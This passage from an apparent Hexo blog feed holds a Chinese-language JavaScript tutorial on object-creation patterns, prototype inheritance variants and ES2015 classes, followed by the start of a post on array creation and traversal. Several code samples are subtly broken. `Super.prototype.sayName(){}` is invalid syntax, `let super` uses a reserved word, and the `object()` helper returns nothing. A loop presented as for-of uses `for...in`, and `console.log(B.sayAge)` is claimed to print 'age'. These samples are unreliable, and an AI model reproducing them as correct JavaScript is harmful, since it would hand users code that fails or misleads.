class="headerlink" title="创建对象的几种模式"></a>创建对象的几种模式</h4><ol><li>工厂模式，即在一个函数内部新建一个对象，初始化后返回这个对象，封装内部细节，返回，但是这个模式是无法识别对象类型的。。。</li><li>构造函数模式，上例</li><li>原型模式，上例</li><li>组合使用构造函数模式和原型模式:</li></ol><p>可见，构造函数模式和原型模式都有自己的不足，我们可以组合使用它们，这个模式也是最常用的模式:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line"><span class="keyword">this</span>.arr = [name,age];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.sayname = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person1 = <span class="keyword">new</span> Person(<span class="string">'luoxia'</span>,<span class="number">19</span>);</span><br><span class="line"><span class="keyword">let</span> person2 = <span class="keyword">new</span> Person(<span class="string">'jane'</span>,<span class="number">18</span>);</span><br><span class="line">person1.arr.push(<span class="string">'add'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person2.arr)<span class="comment">//['jane',18];</span></span><br></pre></td></tr></table></figure></p><p>我们将公用的sayname方法初始化到原型对象上，将实例属性（包括一些引用类型的属性）初始化到实例对象上，可见，各个实例属性的引用类型就不会互相影响了。</p><p>这个模式既做到了公共方法和属性的 共享，又做到了私有属性的互不干扰，而且还可以通过构造函数传递参数，这确实是一个不错的创建对象模式。</p><ol><li>其他模式：动态原型模式，寄生构造函数模式，稳妥构造函数模式，适用于特定场景。</li></ol><h3 id="三-继承"><a href="#三-继承" class="headerlink" title="三.继承"></a>三.继承</h3><p>js的继承和其他语言不同，她是基于原型链的继承。用个例子说话：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.superName = <span class="string">'super'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.subName = <span class="string">'sub'</span>;</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = <span class="keyword">new</span> Super();</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">super</span> = <span class="keyword">new</span> Super();</span><br><span class="line"><span class="keyword">let</span> sub = <span class="keyword">new</span> Sub();</span><br><span class="line"><span class="built_in">console</span>.log(sub.superName);<span class="comment">//super</span></span><br></pre></td></tr></table></figure></p><p>这就是一个继承的例子，Sub的原型对象是Super的实例，这样，在Super实例对象的属性就成为了Sub原型对象的属性，Sub的实例就可以对它进行访问，而此时Super原型对象就有了一个内部属性__proto__指向了Super的原型对象，而subName属性存在于Sub的实例对象当中。</p><p>这样一层层的继承，便形成了一条原型链，处于顶端的是Object类型。</p><p>上述例子便是继承的一种模式，基于原型链的模式，这个存在一个类似于原型创建对象模式的问题,那便是引用类型的互相影响:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = <span class="keyword">new</span> Super();</span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> Sub();</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> Sub();</span><br><span class="line">sub1.arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sub2.arr);<span class="comment">//[1,2,3,4];</span></span><br></pre></td></tr></table></figure></p><p>发现子类型的两个不同实例的引用类型即这里的数组值会互相影响，这是由于这个数组属性是存在于Sub原型对象内的，这样Sub实例对象就共享了这个数组，当然会互相影响。</p><h4 id="继承的方式"><a href="#继承的方式" class="headerlink" title="继承的方式"></a>继承的方式</h4><ol><li>原型链的方式，上例；</li><li>借用构造函数:</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Super.apply(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> Sub();</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> Sub();</span><br><span class="line">sub1.arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sub2.arr);<span class="comment">//[1,2,3];</span></span><br></pre></td></tr></table></figure><p>原理就是在new Sub()的时候，实际上是执行了内部的Super.apply(this)，这样Super函数执行，内部的this又指向的是Sub的实例对象，自然而然的就让所有父类型构造函数的属性和方法给了子类实例，但是这个方式如同构造函数模式创建对象一样，无法公用属性和方法，浪费。</p><ol><li>组合继承:</li></ol><p>可以这么想，和组合方式的创建对象模式类似的思想。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.sayName()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'luoxia'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Super.apply(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = <span class="keyword">new</span> Super();</span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> Sub();</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> Sub();</span><br><span class="line">sub1.arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sub2.arr);<span class="comment">//[1,2,3];</span></span><br></pre></td></tr></table></figure></p><p>看看上面的例子，内部机制是如何的?我们让Sub的原型对象等于Super的实例，这样Super构造函数定义的属性就存在于Sub的原型对象上，而Super.apply(this)则让Super构造函数再次执行，而这时，this指向的是Sub实例对象，所以Super构造函数的属性就存在于实例对象上了，好嘞，这下在Sub原型对象上有个arr属性，在Sub的实例上有个arr属性，由于实例上的同名属性会优先于原型对象上的属性，这样我们访问的就是实例的属性了，当然互不影响，而且对于不同的Sub实例，它们现在都可以访问sayName方法了，因为这个方法存在于Super的原型对象中，可以共享。</p><ol><li>原型式继承，即Object.create()<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(&#123;<span class="attr">name</span>:<span class="string">'luoxia'</span>&#125;);</span><br></pre></td></tr></table></figure></li></ol><p>其实就相当于<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">obj.__proto__ = o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = object();</span><br></pre></td></tr></table></figure></p><p>就是将参数对象作为子类型的__proto__值，好比其构造函数的原型对象。这个对于引用类型的属性，同样会互相影响</p><ol><li>寄生式继承，和原型式类似，不过是在内部对新对象加了一些扩展再返回而已。</li></ol><ol><li>寄生组合继承:</li></ol><p>这个是对组合继承方式的一种改良，在前面的组合继承方式中,存在一个不足，那便是我们既在子类型的原型对象上创建了属性，又在实例对象上创建了同名属性，那么原型对象上的那些属性岂不是浪费时间浪费金钱的产物？而这个方式就是解决这个问题的：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritPrototype</span>(<span class="params">sub,super</span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> prototype = object(<span class="keyword">super</span>.prototype);</span><br><span class="line">prototype.constructor = sub;</span><br><span class="line">sub.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">Sup.prototype.sayName()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'luoxia'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Sup.apply(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">inheritPrototype(Sub,Sup); <span class="comment">//实际上相当于Sub.prototype.__proto__ = Sup.prototype</span></span><br><span class="line"><span class="keyword">let</span> sub1 = <span class="keyword">new</span> Sub();</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> Sub();</span><br><span class="line">sub1.arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sub2.arr);<span class="comment">//[1,2,3];</span></span><br></pre></td></tr></table></figure></p><p>大家可以看到，这个例子并没有显式地设置Sub的原型对象，而是将Super的原型对象复制了一份给Sub，这样的话在Super实例上的属性当然不会跑到Sub上了，这个模式最理想。</p><h3 id="四-多态"><a href="#四-多态" class="headerlink" title="四.多态"></a>四.多态</h3><p>在java中，所谓多态，便是某个对象既属于子类型，又属于父类型，js中也有类似的概率，instanceof操作符就是用来判断实例和原型的关系：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(sub1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(sub1 instaceof Sub);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(sub1 <span class="keyword">instanceof</span> Super);<span class="comment">//true</span></span><br><span class="line">可见，sub1是属于子类型，父类型，也是<span class="built_in">Object</span>类型的</span><br></pre></td></tr></table></figure></p><h3 id="五-ES2015当中的Class及继承"><a href="#五-ES2015当中的Class及继承" class="headerlink" title="五.ES2015当中的Class及继承"></a>五.ES2015当中的Class及继承</h3><p>直接上栗子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    get test()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    set test(name)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'setter'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name,age)&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">static</span> sayAge()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'age'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B(<span class="string">'luoxia'</span>,<span class="number">20</span>);</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> A(<span class="string">'jane'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(b.test);<span class="comment">//luoxia</span></span><br><span class="line">b.test = <span class="string">'jack'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b.test);<span class="comment">//jack</span></span><br><span class="line"><span class="built_in">console</span>.log(B.sayAge);<span class="comment">//age</span></span><br></pre></td></tr></table></figure></p><h4 id="class的对象创建："><a href="#class的对象创建：" class="headerlink" title="class的对象创建："></a>class的对象创建：</h4><p>es2015中的class的类型就是function,但是不能直接执行，只能new实例，而constructor就是它的构造函数，即es5中的构造函数就好比es2015 clss的constructor。</p><p>虽然加了语法糖，其实内部机制类似，class内的方法（非this指定）的都会存在于类的原型对象上，即上述class A：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A.prototype = &#123;</span><br><span class="line">get test()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(b.constructor === B.prototype.constructor);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(B === B.prototype.constructor);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(b.__proto__);<span class="comment">//B.prototype</span></span><br></pre></td></tr></table></figure></p><p>而通过构造函数初始化的属性和方法存在于类的实例化对象上</p><h4 id="class的继承"><a href="#class的继承" class="headerlink" title="class的继承"></a>class的继承</h4><p>class的继承其内部还是原型的继承，不过有区别</p><p>上例中，A和B存在两条继承关系：</p><p>类作为对象的时候：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B.__proto__ = A;</span><br></pre></td></tr></table></figure></p><p>作为构造函数：</p><pre><code>B.prototype.__proto__ = A.prototype;</code></pre><p>主要是由于在创建实例的时候，内部是这样运行的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// B的实例继承A的实例</span></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(B.prototype, A.prototype);</span><br><span class="line"></span><br><span class="line"><span class="comment">// B继承A的静态属性（方法）（static，即直接通过类名调用）</span></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(B, A);</span><br></pre></td></tr></table></figure><p>经过检验：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(b.hasOwnProperty(<span class="string">'name'</span>));<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(b.__proto__.hasOwnProperty(<span class="string">'name'</span>));<span class="comment">//false</span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">说明name是存在于b实例对象上的,B的原型对象上没有这个name属性。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#### es2015和es5继承的联系</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">发现它们的联系了吗？前面讲es5的继承方式有个组合继承方式和寄生组合方式，两种的区别就在于，组合继承方式会在子类型原型上创建多余的属性，而后者，我也在代码里说过，其实质就是设置：</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">Sub.prototype.__proto__ = Sup.prototype</span><br></pre></td></tr></table></figure></p><p>而这个，正好是es2015 class的继承关系。</p><p>聪明的你会想，我们在<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sub.prototype = <span class="keyword">new</span> Sup()；</span><br></pre></td></tr></table></figure></p><p>时不就是让Sub.prototype.__proto__等于Sup.prototype吗，没错，其结果确实是这样，但是用new的时候我们就执行了构造函数，让内部实例属性存在于prototype里了，而我们直接设置Sub.prototype.__proto__ = Sup.prototype只是创建prototype的实例</p><h4 id="es5和es2015继承的区别："><a href="#es5和es2015继承的区别：" class="headerlink" title="es5和es2015继承的区别："></a>es5和es2015继承的区别：</h4><ol><li>对于父类型的构造函数，es5通过apply()或者call()方法指定其在子类型的实例上运行，这里是先有子类型实例的this,再去调用父类型构造函数的，而es2015就不一样了，先要通过super()的运行，才有this,即子类型的构造函数内的this是父类型构造函数给与的，指向子类型实例，所以必须先调用super，才能使用this</li><li>es5子类型实例的constuctor默认指向的是父类型构造函数，而es2015指向子类型构造函数：<pre><code class="js"><span class="built_in">console</span>.log(b.constructor);<span class="comment">//Function B</span><span class="built_in">console</span>.log(sub.constructor);<span class="comment">//Function Sup</span></code></pre><h6 id="es2015的class实质上是和es5差不多的，不过让书写方式更于理解，而且提供了最佳实践的创建对象的方式，就是使用组合构造函数和原型模式来创建对象，而且继承也是最合理的寄生组合方式，这就让开发人员不必去自我揣度最好的方案，让精华成为约定俗成，，这大概就是语言的不断进步吧，希望js变得越来越强大，保持进步，未来会更好！"><a href="#es2015的class实质上是和es5差不多的，不过让书写方式更于理解，而且提供了最佳实践的创建对象的方式，就是使用组合构造函数和原型模式来创建对象，而且继承也是最合理的寄生组合方式，这就让开发人员不必去自我揣度最好的方案，让精华成为约定俗成，，这大概就是语言的不断进步吧，希望js变得越来越强大，保持进步，未来会更好！" class="headerlink" title="es2015的class实质上是和es5差不多的，不过让书写方式更于理解，而且提供了最佳实践的创建对象的方式，就是使用组合构造函数和原型模式来创建对象，而且继承也是最合理的寄生组合方式，这就让开发人员不必去自我揣度最好的方案，让精华成为约定俗成，，这大概就是语言的不断进步吧，希望js变得越来越强大，保持进步，未来会更好！"></a>es2015的class实质上是和es5差不多的，不过让书写方式更于理解，而且提供了最佳实践的创建对象的方式，就是使用组合构造函数和原型模式来创建对象，而且继承也是最合理的寄生组合方式，这就让开发人员不必去自我揣度最好的方案，让精华成为约定俗成，，这大概就是语言的不断进步吧，希望js变得越来越强大，保持进步，未来会更好！</h6></li></ol><h4 id="啊，这算是目前最长的一篇文章了吧，头都大了，js中的坑真是又大又多，但相信我们会在总结中不断成长，文中有什么欠妥的地方，渴望大家的建议。"><a href="#啊，这算是目前最长的一篇文章了吧，头都大了，js中的坑真是又大又多，但相信我们会在总结中不断成长，文中有什么欠妥的地方，渴望大家的建议。" class="headerlink" title="啊，这算是目前最长的一篇文章了吧，头都大了，js中的坑真是又大又多，但相信我们会在总结中不断成长，文中有什么欠妥的地方，渴望大家的建议。"></a>啊，这算是目前最长的一篇文章了吧，头都大了，js中的坑真是又大又多，但相信我们会在总结中不断成长，文中有什么欠妥的地方，渴望大家的建议。</h4>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JavaScript作为一门非常灵活的动态语言，可以有许多不同的编程范式，而面向对象也是其中之一，但是对比传统的面向对象语言，Js有着很多不同，比如原型链的继承方式等等。由于很多容易混淆的概念问题，这篇文章总结一下我在学习和实践当中对js对象的理解。&lt;br&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://luoxia.me/code/tags/JavaScript/"/>
    
      <category term="面向对象" scheme="http://luoxia.me/code/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
  <entry>
    <title>数据结构与算法之数组</title>
    <link href="http://luoxia.me/code/2016/07/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84/"/>
    <id>http://luoxia.me/code/2016/07/07/数据结构与算法之数组/</id>
    <published>2016-07-07T01:21:20.000Z</published>
    <updated>2017-11-16T13:10:06.492Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章是第一篇关于算法与数据结构的文章，有关于数组，后续会有系列性的更新与算法与数据结构有关的文章，其中包括es6的扩展方法<br><a id="more"></a></p><h4 id="1-数组的创建"><a href="#1-数组的创建" class="headerlink" title="1. 数组的创建:"></a>1. 数组的创建:</h4><h5 id="a-构造函数方法"><a href="#a-构造函数方法" class="headerlink" title="a. 构造函数方法"></a>a. 构造函数方法</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br></pre></td></tr></table></figure><p>传递的参数有两种情况，参数为一个时，表示数组长度，返回空数组，而参数个数大于一，则表示每项的值，这种不同的表现方式有些蛋疼，而es6的Array.of()方法则用一致性的变现方式将一组值生成数组</p><h5 id="b-字面量"><a href="#b-字面量" class="headerlink" title="b. 字面量"></a>b. 字面量</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">'white'</span>,<span class="string">'red'</span>,<span class="string">'orange'</span>];</span><br></pre></td></tr></table></figure><p>字面量创建并不自动调用构造函数</p><h4 id="2-判断是否为数组"><a href="#2-判断是否为数组" class="headerlink" title="2. 判断是否为数组"></a>2. 判断是否为数组</h4><p>instanceof方法，Array.isArray()方法，前者在多个 全局执行环境的时候，从一个执行全局传给另一个全局则两者具有不同的Array()构造函数，因此不能正确判断。所以通常使用后者，</p><p>第三种方法 Object.prototype.toString()方法（不仅限于数组）如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(arr) === <span class="string">'[object Array]'</span></span><br></pre></td></tr></table></figure><h4 id="3-遍历读写数组"><a href="#3-遍历读写数组" class="headerlink" title="3. 遍历读写数组"></a>3. 遍历读写数组</h4><h5 id="a-起初，咱们用着非常原始的方法，那便是for循环；"><a href="#a-起初，咱们用着非常原始的方法，那便是for循环；" class="headerlink" title="a.  起初，咱们用着非常原始的方法，那便是for循环；"></a>a.  起初，咱们用着非常原始的方法，那便是for循环；</h5><h5 id="b-由于Js中数组是一种特殊的对象，数组的索引便是数组对象的属性名，我们可以用for-in循环来访问数组"><a href="#b-由于Js中数组是一种特殊的对象，数组的索引便是数组对象的属性名，我们可以用for-in循环来访问数组" class="headerlink" title="b.  由于Js中数组是一种特殊的对象，数组的索引便是数组对象的属性名，我们可以用for-in循环来访问数组:"></a>b.  由于Js中数组是一种特殊的对象，数组的索引便是数组对象的属性名，我们可以用for-in循环来访问数组:</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> index <span class="keyword">in</span> arr)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(arr[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方式本身就不是用于数组遍历的，会产生很多问题（具体省略）</p><h5 id="c-forEach-function-elment-index-arr-…"><a href="#c-forEach-function-elment-index-arr-…" class="headerlink" title="c. forEach(function(elment,index,arr){…})"></a>c. forEach(function(elment,index,arr){…})</h5><p>不能使用break,continue控制语句</p><h5 id="d-ES2015的-for-of循环："><a href="#d-ES2015的-for-of循环：" class="headerlink" title="d. ES2015的 for-of循环："></a>d. ES2015的 for-of循环：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> num <span class="keyword">in</span> arr)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，for-of循环并不只限于访问数组，还可以访问各种具有遍历器接口的类数组,比如Map类型的结构:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> [key,value] <span class="keyword">of</span> phoneMap)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(key + <span class="string">':" + value +'</span>  <span class="string">');</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p><p>用到es6的解构赋值</p><h4 id="4-其他类型数据与数组的转换"><a href="#4-其他类型数据与数组的转换" class="headerlink" title="4. 其他类型数据与数组的转换:"></a>4. 其他类型数据与数组的转换:</h4><h5 id="数组转换为字符串"><a href="#数组转换为字符串" class="headerlink" title="数组转换为字符串:"></a>数组转换为字符串:</h5><p>a. toString(),toLocaleString(),valueOf()将各项用’,’连接返回字符串</p><p>b. 数组实例的join()方法，传入用以连接各项的符号，返回字符串</p><h5 id="其他类型转换为数组"><a href="#其他类型转换为数组" class="headerlink" title="其他类型转换为数组:"></a>其他类型转换为数组:</h5><p>a. 字符串的split()方法转换为数组<br>b. Array.prototype.slice.call(obj,0)将类数组转换为真正的数组</p><p>c. 更一般的，凡是有遍历器接口，或者具有length属性的类数组对象，通过es6的Array.from()可转换为真正的数组,可接受第二个参数为回调函数，类似map()遍历方法，第三个位执行作用域.并且，Array.from()方法能够正确识别unicode码大于\uFFFF的字符，正确得到字符串长度。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countSymbols</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(string).length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>d. 前面讲过的Array.of()方法，将一组值转换为数组，参数个数不同，行为一致<br>e. 扩展运算符…，只能转换具有遍历器接口的数据，不能转换类似数组的对象（即具有length属性的对象):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>)</span>&#123;</span><br><span 